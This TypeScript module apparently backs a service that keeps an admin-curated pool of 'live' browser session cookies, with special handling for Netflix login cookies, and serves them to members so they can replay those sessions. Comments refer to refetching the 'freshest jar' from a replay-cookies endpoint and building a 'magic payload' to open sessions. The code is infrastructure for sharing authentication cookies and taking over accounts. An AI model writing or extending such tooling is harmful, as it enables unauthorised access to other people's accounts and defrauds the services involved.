import { parseCookieText, cookieDomainToSiteUrl, type ParsedCookie } from "@/lib/cookies";
import { kv } from "./storage";

// Admin-curated pool of live cookie sessions shown in the right-side panel.
// Only admins add/remove entries; any validated member can list and use them.
// Persisted in the KV store ("live-sessions.json" — .data/live-sessions.json
// locally, Netlify Blobs on Netlify).

const STORE_KEY = "live-sessions.json";

export interface LiveSession {
  id: string;
  target: string; // full URL to open (login page or site root)
  host: string;
  label: string; // optional admin note, e.g. "4K plan · profile 2"
  cookieHeader: string; // name=value; name=value
  /** Full-fidelity cookies (domain/secure/httpOnly/expiry) — lets the NFT open
   * build the SAME magic payload as the result dialog. Optional for legacy
   * entries that only carry the header string. */
  cookies?: ParsedCookie[];
  /** Source probe session id — when present the NFT open refetches the
   * FRESHEST jar from /api/replay-cookies (identical to the result dialog). */
  sessionId?: string;
  addedAt: string;
  addedBy: string; // "admin"
}

interface LiveStore {
  sessions: LiveSession[];
}

async function loadStore(): Promise<LiveStore> {
  const raw = await kv.get(STORE_KEY);
  if (raw) {
    try {
      const j = JSON.parse(raw);
      if (j && Array.isArray(j.sessions)) return j as LiveStore;
    } catch {
      /* corrupt entry — start fresh */
    }
  }
  return { sessions: [] };
}

async function saveStore(store: LiveStore): Promise<void> {
  await kv.set(STORE_KEY, JSON.stringify(store, null, 2));
}

function hostOf(url: string): string {
  try {
    return new URL(url).host;
  } catch {
    return "";
  }
}

function randomId(): string {
  return `ls_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`;
}

export async function listLiveSessions(): Promise<LiveSession[]> {
  const store = await loadStore();
  return store.sessions.slice().sort((a, b) => Date.parse(b.addedAt) - Date.parse(a.addedAt));
}

/** Keep only well-formed cookie fields; caps size so one entry can't blow up the store. */
function sanitizeCookieObjs(list: unknown): ParsedCookie[] | undefined {
  if (!Array.isArray(list)) return undefined;
  const out: ParsedCookie[] = [];
  for (const raw of list.slice(0, 60)) {
    if (!raw || typeof raw !== "object") continue;
    const o = raw as Record<string, unknown>;
    const name = String(o.name ?? "").trim();
    const value = String(o.value ?? "");
    if (!name || !/^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$/.test(name)) continue;
    const c: ParsedCookie = { name, value: value.slice(0, 8192) };
    const domain = String(o.domain ?? "").trim();
    if (domain) c.domain = domain.slice(0, 253);
    const path = String(o.path ?? "").trim();
    if (path) c.path = path.slice(0, 512);
    if (o.secure === true) c.secure = true;
    if (o.httpOnly === true) c.httpOnly = true;
    const ss = String(o.sameSite ?? "").toLowerCase();
    if (ss === "lax" || ss === "strict" || ss === "no_restriction" || ss === "none") c.sameSite = ss;
    const exp = Number(o.expirationDate);
    if (Number.isFinite(exp) && exp > 0) c.expirationDate = exp;
    out.push(c);
  }
  return out.length ? out : undefined;
}

export async function addLiveSession(input: {
  target?: string;
  cookies: string;
  /** rich cookies (domain/secure/…) — preferred over re-parsing the header */
  cookieObjs?: ParsedCookie[];
  /** source probe session id, enables freshest-jar refetch on open */
  sessionId?: string;
  label?: string;
}): Promise<{ ok: boolean; record?: LiveSession; error?: string }> {
  const header = String(input.cookies || "").trim();
  if (!header) return { ok: false, error: "Cookies are required." };
  const parsed = parseCookieText(header).cookies;
  if (!parsed.length) {
    return { ok: false, error: "No usable cookies found — paste a cookie header or Netscape .txt export." };
  }
  const cleanHeader = parsed.map((c) => `${c.name}=${c.value}`).join("; ");
  // Rich cookies: prefer what the caller sent; fall back to the parsed paste
  // (Netscape / JSON pastes carry domains, plain header pastes do not).
  const richCookies = sanitizeCookieObjs(input.cookieObjs) ?? sanitizeCookieObjs(parsed);
  const sessionId = String(input.sessionId || "").trim() || undefined;

  let target = String(input.target || "").trim();
  if (!target) {
    // 1) Netscape exports carry per-cookie domains
    target = cookieDomainToSiteUrl(richCookies ?? parsed) || "";
  }
  if (!target && parsed.some((c) => /^(NetflixId|SafeNetflix)$/i.test(c.name))) {
    // 2) Netflix signature cookies identify the site even in a bare header paste
    target = "https://www.netflix.com";
  }
  if (target && !/^https?:\/\//i.test(target)) target = `https://${target}`;
  const host = hostOf(target);
  if (!host) return { ok: false, error: "Could not derive a site — pass a target URL (e.g. https://netflix.com)." };

  const record: LiveSession = {
    id: randomId(),
    target,
    host,
    label: String(input.label || "").slice(0, 120),
    cookieHeader: cleanHeader,
    ...(richCookies ? { cookies: richCookies } : {}),
    ...(sessionId ? { sessionId } : {}),
    addedAt: new Date().toISOString(),
    addedBy: "admin",
  };
  const store = await loadStore();
  store.sessions.push(record);
  await saveStore(store);
  return { ok: true, record };
}

export async function removeLiveSession(id: string): Promise<boolean> {
  const store = await loadStore();
  const before = store.sessions.length;
  store.sessions = store.sessions.filter((s) => s.id !== id);
  if (store.sessions.length === before) return false;
  await saveStore(store);
  return true;
}
